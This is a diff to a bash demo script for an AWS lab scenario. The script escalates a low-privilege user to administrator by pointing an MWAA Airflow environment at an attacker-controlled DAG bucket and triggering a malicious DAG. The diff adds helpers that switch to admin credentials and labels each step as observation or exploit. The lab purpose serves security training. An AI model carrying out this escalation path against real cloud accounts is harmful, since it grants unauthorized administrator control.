@@ -84,6 +84,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Retrieve admin cleanup credentials
+ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
+ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+
+if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Extract infrastructure details
 MWAA_ENV_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.mwaa_environment_name')
 ATTACKER_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')
@@ -112,12 +121,22 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_user_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_admin_creds() {
+    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_user_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -139,7 +158,9 @@ ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
+# [OBSERVATION]
 # Step 4: Verify lack of admin permissions
+use_admin_creds
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Checking currently attached policies to starting user..."
 
@@ -157,6 +178,7 @@ fi
 
 echo ""
 echo "Attempting to list IAM users (should fail)..."
+use_starting_user_creds
 show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
@@ -165,7 +187,9 @@ else
 fi
 echo ""
 
+# [OBSERVATION]
 # Step 5: Check current MWAA environment status
+use_admin_creds
 echo -e "${YELLOW}Step 5: Checking current MWAA environment status${NC}"
 echo "Environment: $MWAA_ENV_NAME"
 echo ""
@@ -191,7 +215,9 @@ if [ "$CURRENT_STATUS" != "AVAILABLE" ]; then
 fi
 echo -e "${GREEN}✓ Environment is AVAILABLE${NC}\n"
 
+# [EXPLOIT]
 # Step 6: Update MWAA environment with attacker's DAG bucket
+use_starting_user_creds
 echo -e "${YELLOW}Step 6: Updating MWAA environment with attacker's DAG bucket${NC}"
 echo -e "${MAGENTA}This is the privilege escalation vector!${NC}"
 echo ""
@@ -221,7 +247,9 @@ else
 fi
 echo ""
 
+# [OBSERVATION]
 # Step 7: Wait for MWAA environment to update
+use_admin_creds
 echo -e "${YELLOW}Step 7: Waiting for MWAA environment to update${NC}"
 echo -e "${BLUE}This typically takes 10-30 minutes. Please be patient...${NC}"
 echo ""
@@ -289,7 +317,9 @@ echo "MWAA needs time to discover and parse the new DAGs from the attacker bucke
 sleep 60
 echo -e "${GREEN}✓ DAG sync wait complete${NC}\n"
 
+# [EXPLOIT]
 # Step 9: Trigger the malicious DAG
+use_starting_user_creds
 echo -e "${YELLOW}Step 9: Triggering the malicious DAG${NC}"
 echo -e "${MAGENTA}Using airflow:CreateCliToken to access Airflow API...${NC}"
 echo ""
@@ -347,7 +377,9 @@ echo "Waiting 30 seconds for DAG execution and IAM changes to propagate..."
 sleep 30
 echo -e "${GREEN}✓ Wait complete${NC}\n"
 
+# [OBSERVATION]
 # Step 11: Verify admin access
+use_admin_creds
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Checking if AdministratorAccess is now attached to starting user..."
 
